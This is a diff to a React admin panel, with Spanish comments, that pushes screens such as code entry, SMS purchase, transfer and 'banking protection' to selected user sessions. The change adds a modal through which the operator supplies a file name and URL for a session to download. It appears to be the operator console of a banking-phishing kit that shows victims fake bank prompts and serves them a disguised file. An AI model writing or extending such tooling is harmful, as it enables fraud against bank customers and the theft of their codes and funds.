@@ -13,7 +13,7 @@ import SmsManagement from '@/components/admin/SmsManagement';
 import QRManager from '@/components/admin/QRManager';
 import { SimpleQRGenerator } from '@/components/admin/SimpleQRGenerator';
 import SubscriptionInfo from '@/components/admin/SubscriptionInfo';
-import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, ProtectionBankingModal } from '@/components/admin/Modals';
 import { FileManager } from '@/components/admin/FileManager';
 import { SessionDetails } from '@/components/admin/SessionDetails';
 import { Session, ScreenType } from '@shared/schema';
@@ -484,7 +484,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "proteccion_bancaria"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -496,19 +496,7 @@ export default function AdminPanel() {
       // No necesitamos un modal, simplemente enviamos la pantalla
     }
     
-    // Para proteccion_bancaria, enviamos con información del archivo si existe
-    if (screen === "proteccion_bancaria") {
-      const selectedSession = sessions.find(s => s.sessionId === selectedSessionId);
-      console.log("Enviando pantalla de protección bancaria");
-      sendScreenChange({
-        tipo: `mostrar_${screen}`,
-        sessionId: selectedSessionId,
-        fileName: selectedSession?.fileName,
-        fileUrl: selectedSession?.fileUrl,
-        fileSize: selectedSession?.fileSize
-      });
-      return;
-    }
+
     
     // Para escanear_qr, enviamos directamente sin modal
     console.log("Enviando tipo de pantalla:", screen);
@@ -671,6 +659,17 @@ export default function AdminPanel() {
       return;
     }
     
+    closeModal();
+  };
+
+  const handleProtectionBankingConfirm = (fileData: { fileName: string; fileUrl: string; fileSize: string }) => {
+    sendScreenChange({
+      tipo: 'mostrar_proteccion_bancaria',
+      sessionId: selectedSessionId,
+      fileName: fileData.fileName,
+      fileUrl: fileData.fileUrl,
+      fileSize: fileData.fileSize
+    });
     closeModal();
   };
   
@@ -1065,6 +1064,12 @@ export default function AdminPanel() {
         isOpen={activeModal === 'sms_compra'} 
         onClose={closeModal} 
         onConfirm={handleSmsCompraConfirm} 
+      />
+      <ProtectionBankingModal 
+        isOpen={activeModal === 'proteccion_bancaria'} 
+        onClose={closeModal} 
+        onConfirm={handleProtectionBankingConfirm} 
+        sessionId={selectedSessionId}
       />
       
       {/* Diálogo para enviar SMS */}
